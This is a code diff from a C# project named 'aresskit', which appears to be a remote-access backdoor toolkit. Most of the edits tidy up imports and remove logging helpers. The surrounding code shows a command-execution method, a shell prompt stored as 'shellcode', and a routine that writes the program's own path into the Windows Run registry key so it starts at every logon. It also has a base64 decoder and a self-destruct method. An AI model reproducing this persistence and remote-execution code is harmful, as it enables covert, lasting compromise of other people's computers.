@@ -1,10 +1,6 @@
 ﻿using System;
 using System.Diagnostics;
 using System.IO;
-using System.Linq;
-using System.Net;
-using System.Net.NetworkInformation;
-using System.Net.Sockets;
 using System.Runtime.InteropServices;
 using System.Text;
 
@@ -13,7 +9,7 @@ namespace aresskit
     class Toolkit
     {
         public static string shellcode_ = Directory.GetCurrentDirectory() + "> ";
-        public static byte[] shellcode = System.Text.Encoding.ASCII.GetBytes(shellcode_);
+        public static byte[] shellcode = Encoding.ASCII.GetBytes(shellcode_);
 
         public static string exec(string cmd)
         {
@@ -49,7 +45,7 @@ namespace aresskit
                 ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
 
             string currfile = System.Reflection.Assembly.GetExecutingAssembly().Location;
-            rk.SetValue(System.IO.Path.GetFileName(currfile), currfile);
+            rk.SetValue(Path.GetFileName(currfile), currfile);
         }
         
         // Thanks to: http://stackoverflow.com/a/11743162/5925502
@@ -62,20 +58,6 @@ namespace aresskit
         {
             var base64EncodedBytes = Convert.FromBase64String(base64EncodedData);
             return base64EncodedBytes;
-        }
-        
-        public static void Log(string logMessage, TextWriter w)
-        {
-            w.Write(logMessage);
-        }
-
-        public static void DumpLog(StreamReader r)
-        {
-            string line;
-            while ((line = r.ReadLine()) != null)
-            {
-                Console.WriteLine(line);
-            }
         }
 
         public static string selfDestruct()
